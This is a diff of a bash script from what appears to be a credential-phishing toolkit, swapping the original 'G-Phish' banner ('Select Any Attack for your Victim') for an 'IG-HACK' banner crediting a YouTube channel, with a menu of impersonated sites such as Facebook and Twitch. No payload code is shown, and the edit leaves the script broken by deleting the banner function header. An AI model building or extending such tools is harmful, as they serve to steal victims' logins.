@@ -5,19 +5,35 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
 }
-banner() {
+#bin/bash
+#script By Noob Hackers
+#The real creator of core files is not us so the credits 
+#Goes to real author
+#colours
+#####3#3#
+red='\033[1;31m'
+rset='\033[0m'
+grn='\033[1;32m'
+ylo='\033[1;33m'
+blue='\033[1;34m'
+cyan='\033[1;36m'
+pink='\033[1;35m'
+#coding section starts :)
 clear
-printf " \e[33;1m   ██████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗  \e[0m\n" 
-printf " \e[33;1m  ██╔════╝       ██╔══██╗██║  ██║██║██╔════╝██║  ██║  \e[0m\n"
-printf " \e[33;1m  ██║  ███╗█████╗██████╔╝███████║██║███████╗███████║  \e[0m\n"
-printf " \e[33;1m  ██║   ██║╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║  \e[0m\n"
-printf " \e[33;1m  ╚██████╔╝      ██║     ██║  ██║██║███████║██║  ██║  \e[0m\n"
-printf " \e[33;1m   ╚═════╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝  \e[0m\n"
-printf " \n"
-printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
-printf " \n"
-printf " \e[36;1m.:.Select Any Attack for your Victim.:.\e[0m\n"
-printf " \n"
+echo 
+echo '
+    ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
+    ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
+    ██║██║  ███╗█████╗███████║███████║██║V1.0 █████╔╝ 
+    ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗ 
+    ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
+    ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+' |lolcat
+printf "\n"
+printf "                \e[101m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
+printf "\n"
+printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/noobhackers \e[100m\e[1;77m << \e[0m\n"
+printf "\n"
 }
 menu() {
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt\e[0m\n"
